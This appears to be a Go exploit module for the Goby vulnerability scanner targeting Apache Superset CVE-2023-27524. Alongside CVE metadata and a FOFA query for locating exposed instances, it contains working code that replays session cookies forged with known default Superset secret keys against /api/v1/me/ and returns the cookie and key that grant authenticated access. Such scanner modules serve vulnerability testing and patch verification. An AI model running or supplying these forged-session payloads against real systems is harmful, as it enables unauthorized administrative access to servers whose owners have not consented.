package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Apache Superset Permission Bypass Vulnerability (CVE-2023-27524)",
    "Description": "<p>Apache Superset is a data visualization and data exploration platform of the Apache Foundation. Apache Superset versions 2.0.1 and earlier have security vulnerabilities. Attackers exploit this vulnerability to verify and access unauthorized resources.</p>",
    "Product": "APACHE-Superset",
    "Homepage": "https://superset.apache.org/",
    "DisclosureDate": "2023-04-24",
    "Author": "2268531461@qq.com",
    "FofaQuery": "(title=\"Superset\" && (body=\"appbuilder\" || body=\"<img src=\\\"https://joinsuperset.com/img/supersetlogovector.svg\")) || body=\"<a href=\\\"https://manage.app-sdx.preset.io\\\" class=\\\"button\\\">Back to workspaces</a></section>\" || (body=\"/static/assets/dist/common.644ae7ae973b00abc14b.entry.js\" || (body=\"/static/assets/images/favicon.png\" && body=\"/static/appbuilder/js/jquery-latest.js\") && body=\"Superset\") || header=\"/superset/welcome/\" ||  title=\"500: Internal server error | Superset\" || title=\"404: Not found | Superset\" || banner=\"/superset/welcome/\" || banner=\"/superset/dashboard/\"",
    "GobyQuery": "(title=\"Superset\" && (body=\"appbuilder\" || body=\"<img src=\\\"https://joinsuperset.com/img/supersetlogovector.svg\")) || body=\"<a href=\\\"https://manage.app-sdx.preset.io\\\" class=\\\"button\\\">Back to workspaces</a></section>\" || (body=\"/static/assets/dist/common.644ae7ae973b00abc14b.entry.js\" || (body=\"/static/assets/images/favicon.png\" && body=\"/static/appbuilder/js/jquery-latest.js\") && body=\"Superset\") || header=\"/superset/welcome/\" ||  title=\"500: Internal server error | Superset\" || title=\"404: Not found | Superset\" || banner=\"/superset/welcome/\" || banner=\"/superset/dashboard/\"",
    "Level": "3",
    "Impact": "<p>Attackers can exploit this vulnerability to verify and access unauthorized resources</p>",
    "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. For detailed information and updates, please refer to the vendor's official page: <a href=\"https://github.com/apache/superset\">https://github.com/apache/superset</a></p>",
    "References": [
        "https://lists.apache.org/thread/n0ftx60sllf527j7g11kmt24wvof8xyk"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-27524"
    ],
    "CNNVD": [
        "CNNVD-202304-1915"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.9",
    "Translation": {
        "CN": {
            "Name": "Apache Superset 权限绕过漏洞（CVE-2023-27524）",
            "Product": "APACHE-Superset",
            "Description": "<p>Apache Superset 是美国阿帕奇（Apache）基金会的一个数据可视化和数据探索平台。Apache Superset 2.0.1 版本及之前版本存在安全漏洞。攻击者利用该漏洞验证和访问未经授权的资源。</p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，详情请关注厂商主页：<a href=\"https://github.com/apache/superset\" target=\"_blank\">https://github.com/apache/superset</a></p>",
            "Impact": "<p>攻击者可利用该漏洞验证和访问未经授权的资源。</p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Apache Superset Permission Bypass Vulnerability (CVE-2023-27524)",
            "Product": "APACHE-Superset",
            "Description": "<p>Apache Superset is a data visualization and data exploration platform of the Apache Foundation. Apache Superset versions 2.0.1 and earlier have security vulnerabilities. Attackers exploit this vulnerability to verify and access unauthorized resources.</p>",
            "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. For detailed information and updates, please refer to the vendor's official page: <a href=\"https://github.com/apache/superset\" target=\"_blank\">https://github.com/apache/superset</a><br></p>",
            "Impact": "<p>Attackers can exploit this vulnerability to verify and access unauthorized resources<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10783"
}`
	sendPayloadFlagRgYTd7 := func(u *httpclient.FixUrl) (string, string) {
		secretKey := map[string]string{
			"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.RoFeMf1WLNJXDYslf18x9VGxC0Q": "\\x02\\x01thisismyscretkey\\x01\\x02\\\\e\\\\y\\\\y\\\\h",
			"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hKV8XXVcD6lWhTIoWs0CjrSRPQQ": "CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET",
			"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.xtJXBhmJ0k6_oKs8iGhWJK2BjKs": "thisISaSECRET_1234",
			"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.hRZP41FgqxjaxjJ3WyeIVxyZDng": "YOUR_OWN_RANDOM_GENERATED_SECRET_KEY",
			"eyJfdXNlcl9pZCI6MSwidXNlcl9pZCI6MX0.ZEjVxg.6GpaUB9IP9OnG3HHon3XcdzHWhI": "TEST_NON_DEV_SECRET",
		}
		cfg := httpclient.NewGetRequestConfig("/api/v1/me/")
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		for session, key := range secretKey {
			cfg.Header.Store("Cookie", "session="+session)
			resp, _ := httpclient.DoHttpRequest(u, cfg)
			if resp != nil && resp.StatusCode == 200 && strings.Contains(resp.RawBody, "result\":") && strings.Contains(resp.RawBody, "email\":") && strings.Contains(resp.RawBody, "username\":") {
				return session, key
			}
		}
		return "", ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			session, _ := sendPayloadFlagRgYTd7(u)
			if session == "" {
				return false
			} else {
				return true
			}
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			session, key := sendPayloadFlagRgYTd7(expResult.HostInfo)
			if session != "" {
				expResult.Success = true
				expResult.Output = "Cookie: session=" + session + "\n\nSECRET_KEYS: " + key
			}
			return expResult
		},
	))
}
